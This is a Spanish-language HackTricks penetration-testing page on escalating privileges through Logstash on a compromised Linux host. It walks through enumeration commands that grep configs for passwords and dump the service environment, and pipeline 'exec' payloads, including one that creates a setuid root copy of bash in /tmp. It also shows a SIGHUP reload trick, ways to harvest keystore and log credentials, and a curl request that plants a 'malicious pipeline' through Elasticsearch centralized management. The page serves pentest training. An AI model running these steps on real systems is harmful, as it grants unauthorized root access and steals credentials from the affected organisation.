# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash se utiliza para **recopilar, transformar y enviar registros** a través de un sistema conocido como **pipelines**. Estos pipelines están compuestos por etapas de **input**, **filter** y **output**. Surge un aspecto interesante cuando Logstash se ejecuta en una máquina comprometida.

### Configuración de pipelines

Los pipelines se configuran en el archivo **/etc/logstash/pipelines.yml**, que lista las ubicaciones de las configuraciones de pipeline:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Este archivo revela dónde se encuentran los archivos **.conf**, que contienen las configuraciones de pipelines. Al emplear un **Elasticsearch output module**, es común que los **pipelines** incluyan **credenciales de Elasticsearch**, que a menudo poseen privilegios extensos debido a la necesidad de Logstash de escribir datos en Elasticsearch. Los comodines en las rutas de configuración permiten a Logstash ejecutar todos los pipelines que coincidan en el directorio designado.

Si Logstash se inicia con `-f <directory>` en lugar de `pipelines.yml`, **todos los archivos dentro de ese directorio se concatenan en orden lexicográfico y se analizan como una única config**. Esto crea 2 implicaciones ofensivas:

- Un archivo añadido como `000-input.conf` o `zzz-output.conf` puede cambiar cómo se ensambla el pipeline final
- Un archivo malformado puede impedir que todo el pipeline se cargue, por lo que valide cuidadosamente los payloads antes de confiar en el auto-reload

### Fast Enumeration on a Compromised Host

On a box where Logstash is installed, quickly inspect:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
También comprueba si la API de monitoreo local es accesible. Por defecto escucha en **127.0.0.1:9600**, lo cual suele ser suficiente tras acceder al host:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Esto normalmente te proporciona IDs de pipeline, detalles de tiempo de ejecución y la confirmación de que tu pipeline modificado ha sido cargado.

Las credenciales recuperadas de Logstash comúnmente desbloquean **Elasticsearch**, así que consulta [esta otra página sobre Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Para intentar la escalada de privilegios, identifica primero el usuario bajo el cual se está ejecutando el servicio Logstash, típicamente el usuario **logstash**. Asegúrate de cumplir **uno** de los siguientes criterios:

- Poseer **acceso de escritura** a un archivo de pipeline **.conf** **o**
- El archivo **/etc/logstash/pipelines.yml** usa un wildcard, y puedes escribir en la carpeta objetivo

Además, debe cumplirse **una** de estas condiciones:

- Capacidad para reiniciar el servicio Logstash **o**
- El archivo **/etc/logstash/logstash.yml** tiene **config.reload.automatic: true** configurado

Si hay un wildcard en la configuración, crear un archivo que coincida con ese wildcard permite la ejecución de comandos. Por ejemplo:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Aquí, **interval** determina la frecuencia de ejecución en segundos. En el ejemplo dado, el comando **whoami** se ejecuta cada 120 segundos, con su salida dirigida a **/tmp/output.log**.

Con **config.reload.automatic: true** en **/etc/logstash/logstash.yml**, Logstash detectará y aplicará automáticamente nuevas configuraciones de pipeline o las modificadas sin necesidad de reiniciar. Si no hay wildcard, aún se pueden hacer modificaciones a las configuraciones existentes, pero se recomienda precaución para evitar interrupciones.

### Payloads de pipeline más confiables

El `exec` input plugin sigue funcionando en las versiones actuales y requiere ya sea un `interval` o un `schedule`. Se ejecuta mediante **forking** de la JVM de Logstash, así que si la memoria es escasa tu payload puede fallar con `ENOMEM` en lugar de ejecutarse silenciosamente.

Un privilege-escalation payload más práctico suele ser uno que deje un artefacto duradero:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Si no tienes permisos para reiniciar pero puedes enviar una señal al proceso, Logstash también soporta una recarga activada por **SIGHUP** en sistemas tipo Unix:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Ten en cuenta que no todos los plugins son compatibles con la recarga automática. Por ejemplo, la entrada **stdin** impide la recarga automática, así que no asumas que `config.reload.automatic` captará siempre tus cambios.

### Robando secretos de Logstash

Antes de centrarte solo en la ejecución de código, recoge los datos a los que Logstash ya tiene acceso:

- Las credenciales en texto plano a menudo están codificadas dentro de `elasticsearch {}` outputs, `http_poller`, JDBC inputs, o en configuraciones relacionadas con la nube
- Las configuraciones seguras pueden residir en **`/etc/logstash/logstash.keystore`** o en otro directorio `path.settings`
- La contraseña del keystore suele suministrarse mediante **`LOGSTASH_KEYSTORE_PASS`**, y las instalaciones por paquete comúnmente la obtienen desde **`/etc/sysconfig/logstash`**
- La expansión de variables de entorno con `${VAR}` se resuelve al iniciar Logstash, por lo que vale la pena inspeccionar el entorno del servicio

Comprobaciones útiles:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Esto también merece ser comprobado porque **CVE-2023-46672** demostró que Logstash podría registrar información sensible en los logs en circunstancias específicas. En un host post-explotación, logs antiguos de Logstash y entradas de `journald` pueden por tanto revelar credenciales incluso si la configuración actual referencia el keystore en lugar de almacenar secretos en línea.

### Abuso de la gestión centralizada de pipelines

En algunos entornos, el host **no** depende en absoluto de archivos locales `.conf`. Si **`xpack.management.enabled: true`** está configurado, Logstash puede obtener pipelines gestionados centralmente desde Elasticsearch/Kibana, y tras habilitar este modo las configuraciones locales de pipeline dejan de ser la fuente de la verdad.

Eso implica una ruta de ataque diferente:

1. Recuperar credenciales de Elastic desde las configuraciones locales de Logstash, el keystore o los logs
2. Verificar si la cuenta tiene el privilegio de clúster **`manage_logstash_pipelines`**
3. Crear o reemplazar un pipeline gestionado centralmente para que el host Logstash ejecute tu payload en su siguiente intervalo de sondeo

La API de Elasticsearch utilizada para esta función es:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Esto es especialmente útil cuando los archivos locales son de solo lectura pero Logstash ya está registrado para obtener pipelines de forma remota.

## Referencias

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
